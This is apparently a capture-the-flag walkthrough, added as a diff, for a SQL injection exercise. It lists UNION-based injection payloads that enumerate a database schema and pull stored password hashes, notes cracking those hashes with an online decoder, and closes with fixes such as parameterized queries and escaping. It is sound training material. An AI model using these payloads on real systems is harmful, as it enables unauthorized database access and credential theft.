@@ -1,0 +1,64 @@
+How to get the flag :
+
+999 OR 1 = 1
+
+https://dev.mysql.com/doc/refman/8.0/en/union.html
+https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html
+
+999 UNION SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS
+999 UNION SELECT COLUMN_NAME, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS
+
+Member_Brute_Force :
+  db_default :
+    id,
+    username,
+    password
+
+Member_Sql_Injection :
+  users :
+    first_name,
+    last_name,
+    town,
+    country,
+    planet,
+    Commentaire,
+    countersign
+
+Member_guestbook :
+  guestbook :
+    id_comment,
+    comment,
+    name
+
+Member_images :
+  list_images :
+    id,
+    url,
+    title,
+    comment
+
+Member_survey :
+  vote_dbs :
+    id_vote,
+    vote,
+    nb_vote,
+    subject
+
+reproduction example : mysql_query("SELECT first_name, last_name FROM users WHERE ??" . USER_INPUT)
+
+999 UNION SELECT first_name, Commentaire FROM users
+999 UNION SELECT first_name, countersign FROM users
+
+Put the countersign in the decoder of https://www.dcode.fr/hash-function
+
+Encode the result(after lower all characters) with https://www.dcode.fr/sha256-hash
+
+
+How to solve SQL injection :
+
+PHP example : use mysqli_real_escape_string, a PDO with parametrized queries. No simple concatening
+
+Input validation
+Parametrized queries
+Escaping
+Use an ORM correctly
